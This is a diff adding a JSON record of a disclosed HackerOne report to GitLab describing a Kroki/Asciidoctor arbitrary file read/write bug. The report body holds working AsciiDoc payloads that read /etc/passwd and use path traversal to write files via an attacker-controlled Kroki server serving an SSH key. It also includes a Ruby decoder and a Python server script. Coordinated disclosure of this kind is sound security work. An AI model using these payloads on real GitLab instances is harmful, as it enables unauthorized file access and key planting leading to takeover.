@@ -1,0 +1,140 @@
+{
+  "id": 1098793,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk4Nzkz",
+  "url": "https://hackerone.com/reports/1098793",
+  "title": "Kroki Arbitrary File Read/Write ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-08T22:24:33.083Z",
+  "submitted_at": "2021-02-08T22:24:33.101Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ledz1996",
+    "url": "/ledz1996",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-05-21T19:56:02.582Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-21T19:56:02.525Z",
+  "team_member_agreed_on_going_public_at": "2021-05-21T19:51:33.641Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nIn short, I've found a potentially weird bug in `asciidoctor` that could lead to arbitrary file read/write in `asciidoctor-kroki` even though Gitlab have already made an attempt to disable `kroki-plantuml-include`\n\n**lib/gitlab/asciidoc.rb**\n```rb\nmodule Gitlab\n  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters\n  # the resulting HTML through HTML pipeline filters.\n  module Asciidoc\n    MAX_INCLUDE_DEPTH = 5\n    MAX_INCLUDES = 32\n    DEFAULT_ADOC_ATTRS = {\n        'showtitle' => true,\n        'sectanchors' => true,\n        'idprefix' => 'user-content-',\n        'idseparator' => '-',\n        'env' => 'gitlab',\n        'env-gitlab' => '',\n        'source-highlighter' => 'gitlab-html-pipeline',\n        'icons' => 'font',\n        'outfilesuffix' => '.adoc',\n        'max-include-depth' => MAX_INCLUDE_DEPTH,\n        # This feature is disabled because it relies on File#read to read the file.\n        # If we want to enable this feature we will need to provide a \"GitLab compatible\" implementation.\n        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.\n        # The value can be a path or a URL.\n        'kroki-plantuml-include!' => '',\n        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.\n        'kroki-fetch-diagram!' => ''\n```\n\nHowever this could easily be bypassed by using `counter`\n\nhttps://github.com/asciidoctor/asciidoctor/blob/master/lib/asciidoctor/document.rb\n```rb\n  def counter name, seed = nil\n    return @parent_document.counter name, seed if @parent_document\n    if (attr_seed = !(attr_val = @attributes[name]).nil_or_empty?) && (@counters.key? name)\n      @attributes[name] = @counters[name] = Helpers.nextval attr_val\n    elsif seed\n      @attributes[name] = @counters[name] = seed == seed.to_i.to_s ? seed.to_i : seed\n    else\n      @attributes[name] = @counters[name] = Helpers.nextval attr_seed ? attr_val : 0\n    end\n  end\n```\n\n\n### Steps to reproduce\n\n\n1. Set up Gitlab with Kroki: https://docs.gitlab.com/ee/administration/integration/kroki.html\n**Arbitrary FIle Read**\n2. Create a project, create a wiki page with `asciidoctor` format and the following as payload\n\n```asciidoctor\n[#goals]\n\n[plantuml, test=\"{counter:kroki-plantuml-include:/etc/passwd}\", format=\"png\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- {counter:kroki-plantuml-include}\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n....\n```\n\n3. Get the base64 part of the URL of the image when being rendered\n4. Use the following code to decode the last part of the URL to get the content of file `/etc/passwd`\n\n```rb\nrequire 'base64'\nrequire 'zlib'\n\n\ntest = \"eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\np Zlib::Inflate.inflate(Base64.urlsafe_decode64(test))\n```\n\nVideo:\n\n{F1188648}\n\n**Arbitrary FIle Write**\n1. Create a project, create a wiki page with `asciidoctor` format and the following as payload\n\n```asciidoctor\n[#goals]\n:imagesdir: .\n:outdir: /tmp/\n\n[plantuml]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- hehe\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n....\n```\n\n2. Note in the URL there is a base64 value, copy this value\n\n3. Set up a server with the address that is being appended as `kroki-server-url,`, I used this scriptto serve a public-key file with any URL.\n\n\n```python\n/// python3 this_script.py <port>\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport logging\n\nclass S(BaseHTTPRequestHandler):\n    def _set_response(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self):\n        logging.info(\"GET request,\\nPath: %s\\nHeaders:\\n%s\\n\", str(self.path), str(self.headers))\n        self._set_response()\n        self.wfile.write(b\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local\")\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data\n        post_data = self.rfile.read(content_length) # <--- Gets the data itself\n        logging.info(\"POST request,\\nPath: %s\\nHeaders:\\n%s\\n\\nBody:\\n%s\\n\",\n                str(self.path), str(self.headers), post_data.decode('utf-8'))\n\n        self._set_response()\n        self.wfile.write(\"POST request for {}\".format(self.path).encode('utf-8'))\n\ndef run(server_class=HTTPServer, handler_class=S, port=8080):\n    logging.basicConfig(level=logging.INFO)\n    server_address = ('0.0.0.0', port)\n    httpd = server_class(server_address, handler_class)\n    logging.info('Starting httpd...\\n')\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        pass\n    httpd.server_close()\n    logging.info('Stopping httpd...\\n')\n\nif __name__ == '__main__':\n    from sys import argv\n\n    if len(argv) == 2:\n        run(port=int(argv[1]))\n    else:\n        run()\n```\n\n4. Note the URL and edit the following script to create a SHA256 of the URL\n\n```rb\nrequire 'digest'\nrequire 'base64'\nrequire 'zlib'\n\nstring = \"http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\n\np \"diag-#{Digest::SHA256.hexdigest test = string}\"\n```\n\n4. Create a project, create a wiki page with `asciidoctor` format and the following as payload for the first time, replace the `diag-**.` with the `diag-<output_previous>.`, Please take note of the last `.`\n\n```\n[#goals]\n:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n:outdir: /tmp/\n\n[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- hehe\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n....\n```\n\nSave then render\n\n5. Repeat the previous step with this payload\n\n```\n[#goals]\n:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n:outdir: /tmp/\n\n[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor <|-- hehe\nDiagramBlock <|-- DitaaBlock\nDiagramBlock <|-- PlantUmlBlock\n```\n\nSave then render again\n\n5. You are able to write to any files. You can check this by simply navigate to the file using the Gitlab box\n\nVideo:\n\n{F1188695}\n\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:     Ubuntu 16.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.7.2p137\nGem Version:    3.1.4\nBundler Version:2.1.4\nRake Version:   13.0.1\nRedis Version:  5.0.9\nGit Version:    2.29.0\nSidekiq Version:5.2.9\nGo Version: unknown\n\nGitLab information\nVersion:    13.7.4-ee\nRevision:   368b4fb2eee\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 11.9\nURL:        http://gitlab3.example.vm\nHTTP Clone URL: http://gitlab3.example.vm/some-group/some-project.git\nSSH Clone URL:  git@gitlab3.example.vm:some-group/some-project.git\nElasticsearch:  no\nGeo:        yes\nGeo node:   Primary\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    13.14.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nFile read/write access, RCE",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1188648,
+      "file_name": "Screen_Recording_2021-02-09_at_04.27.43.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/grl4tyx92jvvgwpzzfqeqo2v3jqn?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2021-02-09_at_04.27.43.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2021-02-09_at_04.27.43.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YX5O5ZF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151445Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDrYBeAJmfSrho%2Fo3ydnTGHZMgciTMqd4s%2Bi3051FSKHgIhAN%2FdIMNF5zpPzmkTCuBvT9Wwg6%2BYPipU4qDbZUf6MgabKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzfN8V2bGEkvwhLB0kqjwWN33cGXQ27qYU0ULk0RZRtollgj3I4%2Ff6knuECYYSVHehNm2%2B%2Fls7yT30bRpwXecZ3wjyRR%2BAzMITbfQLLClMHTqk1jH6wJ%2FDrBoOZqOWDJrSp8LgXLh6scwpYmDo9Hc1ALh8lEF9FeL44n8eOGeB114eipW938o11kbmQVbUtKKgCj1YIBtaj3vBVV0IvVZLuRmJ3jHgEEeZzzPzpwQNrpsNgIBhhB09SKf7ZvBYtIbIfdw4MB1kfD5KK3Z0ai%2F95OBUwAeF6qlhWjm1M78CzXMmAl5gT8zrMnypwfOnh94r7pQ136w2yrMg7sPJ%2Ffzv%2F%2BAms%2BMpFvwwCaXSjlInkf2QyNp0Zt8AvRKeVPIOn6jda3HVmddIvrxZKTkZyPZLXlmy2c4oB4A8tjtCoHU2T6pJ5ZPHyI%2B0npv3AFnS78y2Ug8pMuyNwT0l4kL0eDZfSuIdKUj3ryKV3f4h2iq8v%2B9NyOLtSC%2BeKt6zRkj3DiQls0F1uSwh0mmdQpvsYT9pUdguU5CloLGghU7T2luGNv%2B6MjD3%2F1NkmjtPhVbdznLFzz87yzIKw8ZqGDuAdRpzq8ogeeNGJWapah9MYNyqq%2BjlZSh%2FHhfljggs9NHM30yYDFIKX5fD5px9Xk9aeC0X%2BZLBb6EtPjCYF7VOLPQv8Pti7O3ZRkU6mU16yzQW7XZKW5hXR%2FZQiJ1Yg7tD5CZLbgrqihMnsTwtlaXsR9addX9QIGqbPDtXGVrnfW2UR4%2BVqdyHMJEBaMtZzE9L9Mw%2F%2Bn23pQPCzO4TuWn9H1qq6%2BMQzRxD57u4PMawcWNGm6D4y3f7LACfZn0SpaI5FzCvnkskUwGqQmGou9Z%2BK3CsyxGBAEFfYhIqkqWc2ySoeMJaF%2Fc8GOrAB7waFHxH8Hmo9bqH27gqSdTMqs%2BfaICaBZ8KzmWuW0vcV%2BCYZ3FOkuY3zZjc6d%2Brhch4OmCIQ%2B%2BNVw1M4qseGerzWSJi4vGMFEBHgHc3HN0SCZlJhoY%2BTkgIbKDqtiHbj35Mz7TZl0x6zJV9zMewjuK%2F4TU2o1kKVImQhqlOREgbl%2FLkzX2CUHFMDioplV6oNKyjke26FEK6Y%2B%2BFquOsVXxzKKXRxUQ3eN4OcaIA7GJk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b9eb38dc0bc79fdca6e1d8a13a5b22028abb397560262d443ee110b39c7175f2",
+      "file_size": 47985546,
+      "type": "video/quicktime",
+      "moderated": null
+    },
+    {
+      "id": 1188695,
+      "file_name": "Screen_Recording_2021-02-09_at_05.15.11.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gh8p910f56ml1mff5tw8qdiisajx?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2021-02-09_at_05.15.11.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2021-02-09_at_05.15.11.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YX5O5ZF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151445Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDrYBeAJmfSrho%2Fo3ydnTGHZMgciTMqd4s%2Bi3051FSKHgIhAN%2FdIMNF5zpPzmkTCuBvT9Wwg6%2BYPipU4qDbZUf6MgabKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzfN8V2bGEkvwhLB0kqjwWN33cGXQ27qYU0ULk0RZRtollgj3I4%2Ff6knuECYYSVHehNm2%2B%2Fls7yT30bRpwXecZ3wjyRR%2BAzMITbfQLLClMHTqk1jH6wJ%2FDrBoOZqOWDJrSp8LgXLh6scwpYmDo9Hc1ALh8lEF9FeL44n8eOGeB114eipW938o11kbmQVbUtKKgCj1YIBtaj3vBVV0IvVZLuRmJ3jHgEEeZzzPzpwQNrpsNgIBhhB09SKf7ZvBYtIbIfdw4MB1kfD5KK3Z0ai%2F95OBUwAeF6qlhWjm1M78CzXMmAl5gT8zrMnypwfOnh94r7pQ136w2yrMg7sPJ%2Ffzv%2F%2BAms%2BMpFvwwCaXSjlInkf2QyNp0Zt8AvRKeVPIOn6jda3HVmddIvrxZKTkZyPZLXlmy2c4oB4A8tjtCoHU2T6pJ5ZPHyI%2B0npv3AFnS78y2Ug8pMuyNwT0l4kL0eDZfSuIdKUj3ryKV3f4h2iq8v%2B9NyOLtSC%2BeKt6zRkj3DiQls0F1uSwh0mmdQpvsYT9pUdguU5CloLGghU7T2luGNv%2B6MjD3%2F1NkmjtPhVbdznLFzz87yzIKw8ZqGDuAdRpzq8ogeeNGJWapah9MYNyqq%2BjlZSh%2FHhfljggs9NHM30yYDFIKX5fD5px9Xk9aeC0X%2BZLBb6EtPjCYF7VOLPQv8Pti7O3ZRkU6mU16yzQW7XZKW5hXR%2FZQiJ1Yg7tD5CZLbgrqihMnsTwtlaXsR9addX9QIGqbPDtXGVrnfW2UR4%2BVqdyHMJEBaMtZzE9L9Mw%2F%2Bn23pQPCzO4TuWn9H1qq6%2BMQzRxD57u4PMawcWNGm6D4y3f7LACfZn0SpaI5FzCvnkskUwGqQmGou9Z%2BK3CsyxGBAEFfYhIqkqWc2ySoeMJaF%2Fc8GOrAB7waFHxH8Hmo9bqH27gqSdTMqs%2BfaICaBZ8KzmWuW0vcV%2BCYZ3FOkuY3zZjc6d%2Brhch4OmCIQ%2B%2BNVw1M4qseGerzWSJi4vGMFEBHgHc3HN0SCZlJhoY%2BTkgIbKDqtiHbj35Mz7TZl0x6zJV9zMewjuK%2F4TU2o1kKVImQhqlOREgbl%2FLkzX2CUHFMDioplV6oNKyjke26FEK6Y%2B%2BFquOsVXxzKKXRxUQ3eN4OcaIA7GJk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6374bcbbb63cd7f014512e5f93f843fc2092f1f75a38a84f5a89aa47a972bf72",
+      "file_size": 128352293,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 41,
+  "voters": [
+    "viridian_40826d",
+    "n1m0",
+    "haxor31337",
+    "bombon",
+    "battle_angel",
+    "poneglyph",
+    "mattberg",
+    "ali",
+    "bl4de",
+    "h4x0r_dz",
+    "and 31 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
